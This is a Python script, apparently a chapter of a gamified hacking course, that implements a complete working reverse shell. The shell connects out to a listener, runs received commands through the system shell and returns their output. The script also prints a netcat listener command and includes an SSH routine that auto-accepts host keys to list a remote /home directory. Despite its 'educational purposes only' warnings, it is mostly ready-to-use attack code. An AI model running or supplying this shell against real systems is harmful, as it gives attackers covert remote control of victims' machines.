#!/usr/bin/env python3
"""
Chapter 17: Reverse Shell
This script demonstrates creating a reverse shell for remote system control.
WARNING: For educational purposes only! Use only on systems you own.
"""

import socket
import subprocess
import os

def create_reverse_shell(target_ip, target_port):
    """
    Creates a reverse shell connection to target.
    
    Args:
        target_ip (str): IP address of the listener
        target_port (int): Port of the listener
    
    How reverse shells work:
    1. Victim connects to attacker (bypasses firewalls)
    2. Attacker sends commands
    3. Victim executes and returns output
    4. Maintains persistent connection
    
    WARNING: This is for educational purposes only!
    """
    
    print("="*60)
    print("Reverse Shell - Educational Demonstration")
    print("="*60)
    print("[!] WARNING: Use only on systems you own!")
    print("[!] Unauthorized access is illegal!")
    print("="*60 + "\n")
    
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        
        # Connect to listener
        s.connect((target_ip, target_port))
        
        print("[+] Connection established!")
        
        # Send initial message
        hostname = socket.gethostname()
        s.send(f"[+] Connected from {hostname}\n".encode())
        
        # Main shell loop
        while True:
            # Receive command
            command = s.recv(1024).decode().strip()
            
            if not command or command.lower() in ['exit', 'quit']:
                s.send(b"[*] Closing connection...\n")
                break
            
            # Execute command
            try:
                if command.lower().startswith('cd '):
                    # Handle cd command specially
                    path = command[3:].strip()
                    os.chdir(path)
                    output = f"Changed directory to {os.getcwd()}\n"
                else:
                    # Execute other commands
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                
                if not output:
                    output = "[*] Command executed successfully (no output)\n"
                
            except Exception as e:
                output = f"[-] Error: {str(e)}\n"
            
            # Send output back
            s.send(output.encode())
        
        s.close()
        print("[*] Connection closed")
        
    except ConnectionRefusedError:
        print(f"[-] Connection refused - is the listener running on {target_ip}:{target_port}?")
    except Exception as e:
        print(f"[-] Error: {e}")


def list_home_directory(target_host, username, password):
    """
    Lists /home directory on remote system using SSH.
    
    Args:
        target_host (str): Target hostname/IP
        username (str): SSH username
        password (str): SSH password
    """
    
    print("\n" + "="*60)
    print("Listing Remote /home Directory")
    print("="*60)
    
    try:
        import spur
        
        # Connect via SSH
        shell = spur.SshShell(
            hostname=target_host,
            username=username,
            password=password,
            missing_host_key=spur.ssh.MissingHostKey.accept
        )
        
        print(f"[*] Connecting to {target_host}...")
        
        # List /home directory
        result = shell.run(["ls", "-la", "/home"])
        output = result.output.decode('utf-8')
        
        print("[+] Contents of /home directory:")
        print("-"*60)
        print(output)
        print("-"*60)
        
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    """
    Main function for reverse shell demonstration.
    """
    
    print("\n" + "🧛"*30)
    print("Chapter 17: The Vampire Lair - Reverse Shell Quest")
    print("🧛"*30 + "\n")
    
    print("[!] EDUCATIONAL PURPOSE ONLY!")
    print("[!] This demonstrates remote system control concepts")
    print("[!] Only use on systems you own or have permission to test\n")
    
    print("="*60)
    print("Reverse Shell Modes")
    print("="*60)
    print("[1] Create reverse shell connection")
    print("[2] List remote /home directory (SSH)")
    print("[3] Exit")
    
    choice = input("\nSelect mode: ").strip()
    
    if choice == '1':
        print("\n[*] Reverse Shell Mode")
        print("[*] First, start a listener on your attack machine:")
        print("[*] nc -lvnp 4444")
        print()
        
        target_ip = input("Enter listener IP: ").strip()
        target_port = int(input("Enter listener port: ").strip())
        
        create_reverse_shell(target_ip, target_port)
        
    elif choice == '2':
        print("\n[*] SSH Directory Listing Mode")
        
        target = input("Target host: ").strip()
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        
        list_home_directory(target, username, password)
    
    print("\n" + "="*60)
    print("Quest Complete!")
    print("="*60)
    print("[✓] Learned reverse shell concepts")
    print("[*] Remember: Only use on authorized systems!")
    print("="*60 + "\n")


if __name__ == "__main__":
    main()
